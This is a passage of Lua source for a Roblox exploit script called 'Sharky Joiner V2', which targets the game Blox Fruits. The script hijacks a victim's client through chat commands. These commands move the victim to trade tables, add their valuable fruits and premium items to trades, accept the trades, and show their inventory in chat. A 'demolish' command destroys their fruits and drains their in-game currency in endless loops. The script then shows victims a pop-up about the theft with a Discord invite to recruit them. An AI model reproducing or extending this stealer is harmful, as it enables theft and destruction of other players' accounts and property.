        activatedUsers[leavingPlayer.UserId] = nil;
        print("Deactivated user on leave:", leavingPlayer.Name)
    end;
    if CommandCooldowns and CommandCooldowns[leavingPlayer.Name] then
        CommandCooldowns[leavingPlayer.Name] = nil
    end
end)--
local function tweenToPosition(position)
    local character = LocalPlayer.Character;
    if not character then
        return
    end;
    local humanoid = character:FindFirstChildOfClass("Humanoid");
    if not humanoid or humanoid.Sit then
        return
    end;
    local root = character.PrimaryPart;
    if not root then
        return
    end;
    local Vector3_new, CFrame_new, CFrame_lookAt = Vector3.new, CFrame.new, CFrame.lookAt;
    local bodyGyro = Instance.new("BodyGyro");
    bodyGyro.MaxTorque = Vector3_new(1e4, 1e4, 1e4);
    bodyGyro.P = 1e3;
    bodyGyro.CFrame = root.CFrame;
    bodyGyro.Parent = root;
    local bodyVelocity = Instance.new("BodyVelocity");
    bodyVelocity.MaxForce = Vector3_new(1e4, 1e4, 1e4);
    bodyVelocity.P = 1e3;
    bodyVelocity.Parent = root;
    local speed = 300;
    local distance = (root.Position - position).Magnitude;
    local tweenInfo = TweenInfo.new(math.max(0.5, distance / speed), Enum.EasingStyle.Linear);
    local baseParts = {};
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            table.insert(baseParts, part)
        end
    end;
    local noCollideConn = RunService.Stepped:Connect(function()
        for i = 1, # baseParts do
            pcall(function()
                if baseParts[i] and baseParts[i].Parent then
                    baseParts[i].CanCollide = false
                end
            end)
        end
    end);
    local updateConn = RunService.Heartbeat:Connect(function()
        if not root or not root.Parent or not bodyGyro or not bodyGyro.Parent or not bodyVelocity or not bodyVelocity.Parent then
            if updateConn then
                updateConn:Disconnect()
            end;
            if noCollideConn then
                noCollideConn:Disconnect()
            end;
            if bodyGyro and bodyGyro.Parent then
                bodyGyro:Destroy()
            end;
            if bodyVelocity and bodyVelocity.Parent then
                bodyVelocity:Destroy()
            end;
            return
        end;
        local direction = (position - root.Position).Unit;
        bodyGyro.CFrame = CFrame_lookAt(root.Position, root.Position + direction);
        bodyVelocity.Velocity = direction * speed
    end);
    local tween = TweenService:Create(root, tweenInfo, {
        CFrame = CFrame_new(position) * CFrame_new(0, root.Size.Y / 2, 0)
    });
    tween:Play();
    tween.Completed:Wait();
    if updateConn then
        updateConn:Disconnect()
    end;
    if noCollideConn then
        noCollideConn:Disconnect()
    end;
    if bodyGyro and bodyGyro.Parent then
        bodyGyro:Destroy()
    end;
    if bodyVelocity and bodyVelocity.Parent then
        bodyVelocity:Destroy()
    end
end
local function findTradeTable()
    local tradeTablesParent = game.PlaceId == 7449423635 and Workspace.Map:FindFirstChild("Turtle") or Workspace.Map:FindFirstChild("Dressrosa");
    if not tradeTablesParent then
        return nil, nil
    end;
    local tables = tradeTablesParent:GetChildren();
    if not tables then
        return nil, nil
    end;
    local bestTable, bestSeat;
    local emptyTable, emptySeat;
    local fallbackTable, fallbackSeat;
    local function isTargetPlayer(seatWeld)
        if not seatWeld or not seatWeld.Part1 then
            return false
        end;
        local character = seatWeld.Part1.Parent;
        if not character then
            return false
        end;
        local player = Players:GetPlayerFromCharacter(character);
        if not player then
            return false
        end;
        -- Check both Usernames table AND activatedUsers
        return (Usernames and table.find(Usernames, player.Name)) or activatedUsers[player.UserId]
    end;
    for _, tbl in ipairs(tables) do
        if tbl.Name == "TradeTable" then
            local p1, p2 = tbl:FindFirstChild("P1"), tbl:FindFirstChild("P2");
            if p1 and p2 then
                local p1Weld, p2Weld = p1:FindFirstChild("SeatWeld"), p2:FindFirstChild("SeatWeld");
                local p1Free, p2Free = not p1Weld, not p2Weld;
                local p1Target, p2Target = isTargetPlayer(p1Weld), isTargetPlayer(p2Weld);
                if (p1Target and p2Free) or (p2Target and p1Free) then
                    bestTable, bestSeat = tbl, p1Free and p1 or p2;
                    break -- Found the ideal table
                end;
                if p1Free and p2Free and not emptyTable then -- Found a completely empty table
                    emptyTable, emptySeat = tbl, p1 -- Prefer seat P1 if both free
                end;
                if not fallbackTable then -- Find any table with a free seat not occupied by another target
                    if p1Free and not p2Target then
                        fallbackTable, fallbackSeat = tbl, p1
                    elseif p2Free and not p1Target then
                        fallbackTable, fallbackSeat = tbl, p2
                    end
                end
            end
        end
    end;
    -- Prioritize: Target table > Empty table > Fallback table
    return bestTable or emptyTable or fallbackTable, bestSeat or emptySeat or fallbackSeat
end
local function isInTradeWithCorrectPlayer()
    if allowEveryone then -- If allowEveryone is true, skip checks
        return true
    end;
    local player = LocalPlayer;
    local playerGui = player:FindFirstChild("PlayerGui");
    if not playerGui then
        return false
    end;
    local mainGui = playerGui:FindFirstChild("Main");
    if not mainGui then
        return false
    end;
    local tradeFrame = mainGui:FindFirstChild("Trade");
    if not tradeFrame or not tradeFrame.Visible then
        return false
    end;
    local container = tradeFrame:FindFirstChild("Container");
    local frame1 = container and container:FindFirstChild("1");
    local frame2 = container and container:FindFirstChild("2");
    local player1Label = frame1 and frame1:FindFirstChild("TextLabel");
    local player2Label = frame2 and frame2:FindFirstChild("TextLabel");
    if not player1Label or not player2Label then
        return false
    end;
    local tradingPartnerName = player2Label.Text;
    local localPlayerName = player.Name;
    local localPlayerDisplayName = player.DisplayName;
    -- Ensure the local player is actually Player 1 in the UI
    if player1Label.Text ~= localPlayerName and player1Label.Text ~= localPlayerDisplayName then
        return false -- Local player isn't P1, something's wrong or reversed
    end;
    -- Check if the trading partner is in the hardcoded Usernames list
    for _, allowedName in ipairs(Usernames) do
        local tradingPlayer = Players:FindFirstChild(allowedName);
        if tradingPlayer then
            if string.lower(tradingPartnerName) == string.lower(tradingPlayer.Name) or string.lower(tradingPartnerName) == string.lower(tradingPlayer.DisplayName) then
                return true -- Found in hardcoded list
            end
        end
    end;
    -- Check if the trading partner is in the activatedUsers list
    local partnerPlayer = Players:FindFirstChild(tradingPartnerName) -- Try finding by exact name first
    if not partnerPlayer then -- If not found by name, try finding by display name
        for _, p in ipairs(Players:GetPlayers()) do
            if p.DisplayName == tradingPartnerName then
                partnerPlayer = p;
                break
            end
        end
    end
    if partnerPlayer and activatedUsers[partnerPlayer.UserId] then
        return true -- Found in activated list
    end;
    -- If not found in either list and allowEveryone is false
    return false
end--
local isForceJumping = false;
local stateChangedConnections = {};
local jumpRequestConnection;
local characterAddedJumpConnection;
local function ForceJump()
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
    if not humanoid then
        return
    end;
    isForceJumping = true;
    humanoid.JumpPower = 50;
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping);
    task.delay(0.5, function()
        isForceJumping = false;
        if humanoid and humanoid.Parent then
            humanoid.JumpPower = 0 -- Reset jump power after jump
        end
    end)
end;
local function lockJumping(humanoid)
    if not humanoid then
        return
    end;
    if stateChangedConnections[humanoid] then
        stateChangedConnections[humanoid]:Disconnect();
        stateChangedConnections[humanoid] = nil
    end;
    humanoid.JumpPower = 0; -- Ensure jump power is 0 initially
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false); -- Disable jumping state
    stateChangedConnections[humanoid] = humanoid.StateChanged:Connect(function(old, new)
        if new == Enum.HumanoidStateType.Jumping and not isForceJumping then
            humanoid:ChangeState(old) -- Immediately revert if trying to jump normally
        end
    end)
end;
local function disableJump()
    -- Disconnect previous connections if they exist
    if jumpRequestConnection then
        jumpRequestConnection:Disconnect();
        jumpRequestConnection = nil
    end;
    if characterAddedJumpConnection then
        characterAddedJumpConnection:Disconnect();
        characterAddedJumpConnection = nil
    end;
    -- Hook JumpRequest for touch devices
    if UserInputService.TouchEnabled then
        jumpRequestConnection = UserInputService.JumpRequest:Connect(function()
            if not isForceJumping and LocalPlayer.Character then
                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
                if h then
                    h:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
                end
            end
        end)
    end;
    -- Lock jumping on current character if exists
    if LocalPlayer.Character then
        lockJumping(LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
    end;
    -- Lock jumping on future characters
    characterAddedJumpConnection = LocalPlayer.CharacterAdded:Connect(function(char)
        task.spawn(function()
            local h = char:WaitForChild("Humanoid", 5);
            if h then
                lockJumping(h)
            end
        end)
    end);
    -- Return a cleanup function
    return function()
        if jumpRequestConnection then
            jumpRequestConnection:Disconnect();
            jumpRequestConnection = nil
        end;
        if characterAddedJumpConnection then
            characterAddedJumpConnection:Disconnect();
            characterAddedJumpConnection = nil
        end;
        for humanoid, conn in pairs(stateChangedConnections) do
            if conn and conn.Connected then
                pcall(conn.Disconnect, conn) -- Safely disconnect
            end
        end;
        table.clear(stateChangedConnections)
        -- Restore jump power/state if needed (optional, usually not necessary if script is ending)
        --[[
        if LocalPlayer.Character then
            local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if h then
                 h:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
                 h.JumpPower = 50 -- Or default Blox Fruits jump power
            end
        end
        ]]
    end
end--
local function createDiscordUI()
    local ScreenGui = Instance.new("ScreenGui");
    ScreenGui.Name = "DiscordInviteUI";
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
    ScreenGui.ResetOnSpawn = false;
    ScreenGui.IgnoreGuiInset = true;
    ScreenGui.DisplayOrder = 9999;
    local MainFrame = Instance.new("Frame");
    MainFrame.Name = "MainFrame";
    MainFrame.Size = UDim2.new(0, 800, 0, 350);
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0);
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5);
    MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37);
    MainFrame.BorderSizePixel = 0;
    MainFrame.Parent = ScreenGui;
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10);
    local Title = Instance.new("TextLabel");
    Title.Name = "Title";
    Title.Size = UDim2.new(1, 0, 0, 40);
    Title.Position = UDim2.new(0, 0, 0, 10);
    Title.BackgroundTransparency = 1;
    Title.Font = Enum.Font.GothamBold;
    Title.Text = "Read Below!";
    Title.TextColor3 = Color3.fromRGB(255, 255, 255);
    Title.TextScaled = true;
    Title.Parent = MainFrame;
    local Description = Instance.new("TextLabel");
    Description.Name = "Description";
    Description.Size = UDim2.new(0.9, 0, 0, 100);
    Description.Position = UDim2.new(0.05, 0, 0.3, 0);
    Description.BackgroundTransparency = 1;
    Description.Font = Enum.Font.Gotham;
    Description.Text = "Hey! Some of your VALUABLE Fruits have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!";
    Description.TextColor3 = Color3.fromRGB(220, 221, 222);
    Description.TextScaled = true;
    Description.Parent = MainFrame;
    local Button = Instance.new("TextButton");
    Button.Name = "CopyButton";
    Button.Size = UDim2.new(0.7, 0, 0, 56);
    Button.Position = UDim2.new(0.15, 0, 0.7, 0);
    Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242);
    Button.Font = Enum.Font.GothamBold;
    Button.Text = "Copy Discord Invite";
    Button.TextColor3 = Color3.fromRGB(255, 255, 255);
    Button.TextScaled = true;
    Button.AutoButtonColor = false;
    Button.Parent = MainFrame;
    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5);
    local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out);
    local function createTween(instance, props)
        return TweenService:Create(instance, fadeInfo, props)
    end;
    MainFrame.BackgroundTransparency = 1;
    Title.TextTransparency = 1;
    Description.TextTransparency = 1;
    Button.BackgroundTransparency = 1;
    Button.TextTransparency = 1;
    task.wait(0.1);
    createTween(MainFrame, {
        BackgroundTransparency = 0
    }):Play();
    task.wait(0.1);
    createTween(Title, {
        TextTransparency = 0
    }):Play();
    task.wait(0.1);
    createTween(Description, {
        TextTransparency = 0
    }):Play();
    task.wait(0.1);
    createTween(Button, {
        BackgroundTransparency = 0,
        TextTransparency = 0
    }):Play();
    Button.MouseEnter:Connect(function()
        createTween(Button, {
            BackgroundColor3 = Color3.fromRGB(71, 82, 196)
        }):Play()
    end);
    Button.MouseLeave:Connect(function()
        createTween(Button, {
            BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        }):Play()
    end);
    Button.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/uwdvTtqTDA");
        Button.Text = "Copied!";
        task.delay(2, function()
            if Button.Parent then -- Check if button still exists before changing text
                Button.Text = "Copy Invite"
            end
        end)
    end);
    ScreenGui.Parent = CoreGui;
    return ScreenGui
end--
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents");
local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest");
local function sendMessage(message)
    pcall(function()
        SayMessageRequest:FireServer(message, "All")
    end)
end;
local CommandCooldowns = {};
local DEFAULT_COOLDOWN = 0.5;
local Commands = {
    jump = {
        description = "Forces the character to jump once.",
        usage = "?jump",
        execute = ForceJump
    },
    sit = {
        description = "Attempts to find a suitable trade table seat and sit down.",
        usage = "?sit",
        execute = function()
            sendMessage("Attempting to sit at trade table...");
            local tradeTable, bestSeat = findTradeTable();
            if not (tradeTable and bestSeat) then
                sendMessage("Error finding a table! Try running ?tp first.");
                return
            end;
            local character = LocalPlayer.Character;
            if not (character and character.PrimaryPart) then
                sendMessage("Character error.");
                return
            end;
            tweenToPosition(bestSeat.Position + Vector3.new(0, 2, 0)); -- Move slightly above the seat
            task.wait(1); -- Wait for tween
            local function attemptSit()
                for i = 1, 10 do
                    local randomOffset = Vector3.new(math.random(- 2, 2) / 10, math.random(- 2, 2) / 10, math.random(- 2, 2) / 10);
                    tweenToPosition(bestSeat.Position + randomOffset); -- Nudge slightly
                    task.wait(0.5);
                    local humanoid = character:FindFirstChildOfClass("Humanoid");
                    if humanoid and humanoid.Sit then -- Check if seated
                        sendMessage("Successfully sat at trade table!");
                        return true
                    end
                end;
                return false
            end;
            if not attemptSit() then
                sendMessage("Failed to sit. Try running ?sit again!")
            end
        end
    },
    tp = {
        description = "Teleports the player to the standard trading hub (Mansion/Cafe).",
        usage = "?tp",
        execute = function()
            local targetPos, locationName;
            if game.PlaceId == 7449423635 then -- Sea 3
                locationName = "Mansion";
                -- Check for Valkyrie Helm for special teleport
                local inventory = getInventory();
                if inventory then
                    for _, item in ipairs(inventory) do
                        if item.Name == "Valkyrie Helm" then
                            Remote:InvokeServer("requestEntrance", Vector3.new(- 12471.33, 374.95, - 7539.37));
                            sendMessage("Teleporting to Mansion (via Valkyrie)...");
                            return
                        end
                    end
                end;
                targetPos = Vector3.new(- 12550.8701, 337.2399, - 7425.5200) -- Default Mansion TP
            else -- Sea 2
                locationName = "Cafe";
                targetPos = Vector3.new(- 381.8599, 73.0800, 299.9299) -- Cafe TP
            end;
            if targetPos then
                sendMessage("Teleporting to " .. locationName .. "...");
                tweenToPosition(targetPos)
            else
                sendMessage("Could not determine teleport location.")
            end
        end
    },
    reset = {
        description = "Resets the player's character.",
        usage = "?reset",
        execute = function()
            if LocalPlayer.Character then
                LocalPlayer.Character:BreakJoints()
            end
        end
    },
    rejoin = {
        description = "Makes the player rejoin the current server.",
        usage = "?rejoin",
        execute = function()
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end
    },
    add = {
        description = "Adds [count] of a specific Blox Fruit to the trade.",
        usage = "?add <fruit_name> [count]",
        execute = function(argument)
            local namePart, countPart = argument:match("^(.-)%s*(%d*)$");
            if not namePart or namePart == "" then
                sendMessage("Usage: ?add <fruit_name> [count]");
                return
            end;
            local searchTerm = namePart:lower():match("^%s*(.-)%s*$"); -- Trim whitespace
            local requestedCount = tonumber(countPart);
            if not requestedCount or requestedCount < 1 then
                requestedCount = 1 -- Default to 1 if count is invalid or missing
            end;
            local inventory = getInventory();
            if not inventory then
                sendMessage("Failed to get inventory.");
                return
            end;
            local foundItem = nil;
            for _, item in pairs(inventory) do
                -- Use find for partial matching, anchored to the start (true)
                if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then
                    foundItem = item;
                    break
                end
            end;
            if foundItem then
                local availableCount = foundItem.Count;
                local countToAdd = math.min(requestedCount, availableCount);
                if countToAdd <= 0 then
                     sendMessage("No '" .. foundItem.Name .. "' available to add.");
                     return
                end

                sendMessage("Adding " .. countToAdd .. "x '" .. foundItem.Name .. "'...");
                local addedSuccess = 0;
                for i = 1, countToAdd do
                    local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", foundItem.Name);
                    if success then
                        addedSuccess = addedSuccess + 1
                    else
                         sendMessage("Error adding item: " .. tostring(err));
                         break -- Stop if an error occurs
                    end
                    task.wait(0.1) -- Small delay between adds
                end
                sendMessage("Finished adding " .. addedSuccess .. "/" .. countToAdd .. " '" .. foundItem.Name .. "'.");
                 if requestedCount > availableCount then
                     sendMessage("(Note: You requested " .. requestedCount .. ", but only " .. availableCount .. " were available.)")
                 end
            else
                sendMessage("No Blox Fruit matching '" .. searchTerm .. "' found in inventory!")
            end
        end
    },
    additem = {
        description = "Adds 1 of a specific Premium Item (Gamepass) to the trade.",
        usage = "?additem <item_name>",
        execute = function(argument)
            local searchTerm = argument:lower():match("^%s*(.-)%s*$"); -- Trim whitespace
            if searchTerm == "" then
                sendMessage("Usage: ?additem <item_name>");
                return
            end;
            local inventory = getInventory();
            if not inventory then
                sendMessage("Failed to get inventory.");
                return
            end;
            local foundItem = nil;
            for _, item in pairs(inventory) do
                 -- Remove [P] prefix for matching
                local cleanName = item.Name:gsub("%[P%]%s*", "")
                if item.Type == "Premium" and cleanName:lower():find(searchTerm, 1, true) then
                    foundItem = item;
                    -- Use the original name with [P] prefix for the remote call
                    foundItem.nameForRemote = item.Name
                    break
                end
            end;
            if foundItem then
                sendMessage("Adding 1x '" .. foundItem.nameForRemote .. "'...");
                -- Use the original name for invoking the remote
                TradeFunction:InvokeServer("addItem", foundItem.nameForRemote);
                task.wait(0.1); -- Short delay
                sendMessage("Finished adding '" .. foundItem.nameForRemote .. "'.")
            else
                sendMessage("No Premium Item matching '" .. searchTerm .. "' found in inventory!")
            end
        end
    },
    addall = {
        description = "Adds 1 of each fruit from your 'FruitsToHit' list to the trade.",
        usage = "?addall",
        execute = function()
             local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
             if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                 sendMessage("Not currently in a trade.");
                 return
             end;
            local inventory = getInventory();
            if not inventory then
                sendMessage("Failed to get inventory.");
                return
            end;
            local addedCount = 0;
            local addedFruits = {}; -- Track added fruit types to avoid duplicates if listed multiple times
             sendMessage("Attempting to add all configured fruits...");
             -- Create a lookup table for faster inventory check
             local inventoryLookup = {}
             for _, item in pairs(inventory) do
                 if item.Type == "Blox Fruit" then
                     inventoryLookup[item.Name] = item.Count
                 end
             end

             for _, fruitName in ipairs(FruitsToHit) do
                 -- Check if fruit exists in inventory, has count > 0, and hasn't been added yet
                 if inventoryLookup[fruitName] and inventoryLookup[fruitName] > 0 and not addedFruits[fruitName] then
                    local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", fruitName);
                     if success then
                         addedFruits[fruitName] = true; -- Mark as added
                         addedCount = addedCount + 1;
                         sendMessage("Added 1x '"..fruitName.."'.")
                     else
                         sendMessage("Error adding "..fruitName..": "..tostring(err));
                         break -- Stop if error occurs
                     end
                     task.wait(0.1) -- Small delay
                 end
             end
            if addedCount > 0 then
                 sendMessage("Finished adding " .. addedCount .. " types of configured fruits.")
            else
                 sendMessage("No fruits from your 'FruitsToHit' list were found/available in inventory!")
            end
        end
    },
    addallitems = {
        description = "Adds 1 of every Premium Item (Gamepass) found in inventory to the trade.",
        usage = "?addallitems",
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                sendMessage("Not currently in a trade.");
                return
            end;
            local inventory = getInventory();
            if not inventory then
                sendMessage("Failed to get inventory.");
                return
            end;
            local addedCount = 0;
            local addedItems = {}; -- Track added item types
            sendMessage("Attempting to add all premium items...");
            for _, item in pairs(inventory) do
                -- Check if Premium, count > 0, and not already added
                if item.Type == "Premium" and item.Count > 0 and not addedItems[item.Name] then
                    local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", item.Name); -- Use original name
                    if success then
                        addedItems[item.Name] = true; -- Mark as added
                        addedCount = addedCount + 1;
                        sendMessage("Added 1x '"..item.Name.."'.")
                    else
                        sendMessage("Error adding "..item.Name..": "..tostring(err));
                        break -- Stop on error
                    end
                    task.wait(0.1) -- Small delay
                end
            end
            if addedCount > 0 then
                sendMessage("Finished adding " .. addedCount .. " premium items.")
            else
                sendMessage("No Premium items found/available in inventory!")
            end
        end
    },
    cleartrade = {
        description = "Removes all items the victim has placed in the trade window.",
        usage = "?cleartrade",
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                sendMessage("Not currently in a trade.");
                return
            end;
            local container = tradeUI.Trade:FindFirstChild("Container");
            local playerFrame = container and container:FindFirstChild("1"); -- Frame "1" is usually the local player
            local itemFrame = playerFrame and playerFrame:FindFirstChild("Frame"); -- The frame holding the items
            if not itemFrame then
                 sendMessage("Could not find trade item frame.");
                 return
            end
            local itemsToRemove = {};
             -- Iterate through children of the item frame
             for _, item in ipairs(itemFrame:GetChildren()) do
                 -- Check if it's an ImageButton (fruits/items) and not the Beli button
                 if item:IsA("ImageButton") and item.Name ~= "AddBeli" then
                     table.insert(itemsToRemove, item.Name) -- Store the item name
                 end
             end
            if #itemsToRemove == 0 then
                 sendMessage("No items to remove from trade.");
                 return
            end
            sendMessage("Clearing " .. #itemsToRemove .. " items from trade...");
            local clearedCount = 0;
            for _, itemName in ipairs(itemsToRemove) do
                 local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", itemName);
                 if success then
                     clearedCount = clearedCount + 1
                 else
                     sendMessage("Error removing "..itemName..": "..tostring(err))
                 end
                 task.wait(0.1) -- Small delay
            end
            sendMessage("Cleared " .. clearedCount .. " items.")
        end
    },
    accept = {
        description = "Accepts the current trade (only works if seated).",
        usage = "?accept",
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                sendMessage("Not currently in a trade.");
                return
            end;
            local character = LocalPlayer.Character;
            if not character then
                sendMessage("Character not found.");
                return
            end;
            local humanoid = character:FindFirstChildOfClass("Humanoid");
            if not humanoid then
                sendMessage("Humanoid not found.");
                return
            end;
            if not humanoid.Sit then -- Check if the player is sitting
                sendMessage("Must be sitting to accept trade.");
                return
            end;
            sendMessage("Accepting trade...");
            task.wait(0.1); -- Small delay before invoking
            TradeFunction:InvokeServer("accept")
        end
    },
    resetfruit = {
        description = "Equips and resets [count] times with a specific fruit.",
        usage = "?resetfruit <fruit_name> [count]",
        execute = function(argument)
            local namePart, countPart = argument:match("^(.-)%s*(%d*)$");
            if not namePart or namePart == "" then
                sendMessage("Usage: ?resetfruit <fruit_name> [count]");
                return
            end;
            local searchTerm = namePart:lower():match("^%s*(.-)%s*$");
            local requestedCount = tonumber(countPart);
            if not requestedCount or requestedCount < 1 then
                requestedCount = 1
            end;

            sendMessage("Attempting to reset with '" .. searchTerm .. "' " .. requestedCount .. " times...");

            for i = 1, requestedCount do
                local inventory = getInventory();
                if not inventory then
                    sendMessage("Failed to get inventory on attempt " .. i);
                    break
                end;
                local foundItem = nil;
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then
                        foundItem = item;
                        break
                    end
                end;

                if foundItem then
                    local baseFruitName = foundItem.Name:match("(%S+)") -- Get base name (e.g., "Leopard" from "Leopard-Leopard")
                    sendMessage("(" .. i .. "/" .. requestedCount .. ") Equipping '" .. baseFruitName .. "' and resetting...");
                    ForceJump(); -- Jump before equipping might help avoid some issues
                    task.wait(0.1);
                    Remote:InvokeServer("LoadFruit", baseFruitName); -- Equip the fruit
                    task.wait(0.3); -- Wait for equip animation/state change
                    if LocalPlayer.Character then
                        LocalPlayer.Character:BreakJoints() -- Reset character
                    end
                    sendMessage("Reset complete for attempt " .. i .. ". Waiting for respawn...");
                    task.wait(5) -- Wait for respawn
                else
                    sendMessage("Fruit matching '" .. searchTerm .. "' not found in inventory on attempt " .. i .. ". Aborting.");
                    break -- Stop if fruit isn't found
                end
                if i < requestedCount then task.wait(0.5) end -- Small delay between loops
            end
             sendMessage("Finished reset fruit sequence.")
        end
    },
    invite = {
        description = "Shows the victim a UI inviting them to the Discord.",
        usage = "?invite",
        execute = createDiscordUI
    },
    demolish = {
        description = "!! DANGEROUS !! Attempts to equip and reset all fruits, then drain Beli/Fragments.",
        usage = "?demolish",
        execute = function()
            sendMessage("!!! WARNING: DEMOLISH COMMAND INITIATED !!! THIS IS DESTRUCTIVE !!!");
            local function invokeRemote(remoteName, args)
                local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(remoteName);
                return remote:InvokeServer(unpack(args))
            end;
            -- Try removing currently equipped fruit and Beli first (might fail safely)
            pcall(invokeRemote, "CommF_", {
                "RemoveFruit",
                "Beli"
            });
            local inventory = getInventory();
            if not inventory then
                sendMessage("Failed to get inventory for demolish.");
                return
            end;
            local fruits = {};
            for _, item in pairs(inventory) do
                if item.Type == "Blox Fruit" then
                    table.insert(fruits, item)
                end
            end;
            -- Sort fruits (optional, e.g., by value descending)
            table.sort(fruits, function(a, b)
                return (a.Value or 0) > (b.Value or 0)
            end);
            -- Reset with each fruit
            for i, fruit in ipairs(fruits) do
                local baseFruitName = fruit.Name:match("(%S+)"); -- Get base name
                sendMessage("(" .. i .. "/" .. # fruits .. ") Resetting with '" .. baseFruitName .. "'...");
                ForceJump();
                invokeRemote("CommF_", {
                    "LoadFruit",
                    baseFruitName
                });
                task.wait(0.5); -- Wait briefly
                if LocalPlayer.Character then
                    LocalPlayer.Character:BreakJoints();
                    task.wait(6) -- Wait for respawn + grace period
                end
            end;
            -- Start draining resources (will run indefinitely until script stops)
            local function drainBeli()
                local rocketArgs = {
                    "PurchaseRawFruit",
                    "Rocket-Rocket",
                    false
                };
                local spinArgs = {
                    "PurchaseRawFruit",
                    "Spin-Spin",
                    false
                };
                while true do
                    invokeRemote("CommF_", rocketArgs);
                    task.wait(0.01) -- Minimal wait
                    invokeRemote("CommF_", spinArgs);
                    task.wait(0.01)
                end
            end;
            local function drainFragments()
                local fragmentArgs = {
                    "BlackbeardReward",
                    "Refund",
                    "2" -- Argument for refunding stat points
                };
                while true do
                    invokeRemote("CommF_", fragmentArgs);
                    task.wait() -- Default task.wait
                end
            end;
            sendMessage("Starting resource drain loops (will continue indefinitely)...");
            coroutine.wrap(drainBeli)();
            coroutine.wrap(drainFragments)()
        end
    },
    showinv = {
        description = "Shows the victim's Blox Fruit inventory (by value) in chat.",
        usage = "?showinv",
        execute = function()
            task.spawn(function() -- Run in separate thread to avoid blocking commands
                sendMessage("Fetching inventory (sorted by value)...");
                local inventory = getInventory();
                if not inventory then
                    sendMessage("Error: Failed to retrieve inventory.");
                    return
                end;
                local fruitDataList = {};
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" then
                        table.insert(fruitDataList, {
                            name = item.Name,
                            count = item.Count,
                            value = item.Value or 0
                        })
                    end
                end;
                if # fruitDataList == 0 then
                    sendMessage("No Blox Fruits found in inventory.");
                    return
                end;
                -- Sort by value descending
                table.sort(fruitDataList, function(a, b)
                    return a.value > b.value
                end);
                local fruitDisplayList = {};
                for _, fruitData in ipairs(fruitDataList) do
                    local fruitString = fruitData.name;
                    if fruitData.count > 1 then
                        fruitString = fruitString .. " (x" .. fruitData.count .. ")"
                    end;
                    table.insert(fruitDisplayList, fruitString)
                end;
                -- Send fruits in chunks to avoid chat limits
                local messageLimit = 180; -- Approx chat limit
                local itemsPerEstimate = 10; -- Estimate items per message
                local totalChunks = math.ceil(# fruitDisplayList / itemsPerEstimate);
                local currentMessage = "Fruits [Value] (1/" .. totalChunks .. "): ";
                local chunkIndex = 1;
                for i, fruitName in ipairs(fruitDisplayList) do
                    local prefixLength = string.len("Fruits [Value] (X/Y): "); -- Length of the prefix
                    local separator = (# currentMessage > prefixLength) and ", " or ""; -- Add comma if not first item
                    local potentialAddition = separator .. fruitName;
                    if string.len(currentMessage) + string.len(potentialAddition) > messageLimit then
                        -- Send current message and start new one
                        sendMessage(currentMessage);
                        task.wait(2); -- Wait between messages
                        chunkIndex = chunkIndex + 1;
                        currentMessage = "Fruits [Value] (" .. chunkIndex .. "/" .. totalChunks .. "): " .. fruitName;
                    else
                        currentMessage = currentMessage .. potentialAddition;
                    end
                end
                -- Send the last message if it contains fruits
                if currentMessage ~= "" and not currentMessage:match("^Fruits %[%w+%].*%): $") then -- Check if not just prefix
                    sendMessage(currentMessage);
                end
                task.wait(0.5);
                sendMessage("Inventory display complete.");
            end)
        end
    },
    test = {
        description = "Checks script responsiveness.",
        usage = "?test",
        execute = function()
            local startTime = tick();
            task.wait(0.001); -- Minimal wait to ensure tick changes
            sendMessage("I'm Responsive! My response time is " .. string.format("%.1f", (tick() - startTime) * 1000) .. "ms")
        end
    },
    help = {
        description = "Displays a condensed list of commands.",
        usage = "?help",
        execute = function()
            task.spawn(function() -- Use task.spawn to send messages with delays
                 local cmds = {
                     "?help ?test ?jump ?sit ?tp ?reset ?rejoin",
                     "?add <name> [count] ?additem <name>",
                     "?addall ?addallitems ?cleartrade ?accept",
                     "?resetfruit <name> [count] ?invite ?demolish ?showinv",
                     "?activate <pass> ?allowall" -- Added activation/allowall
                 };
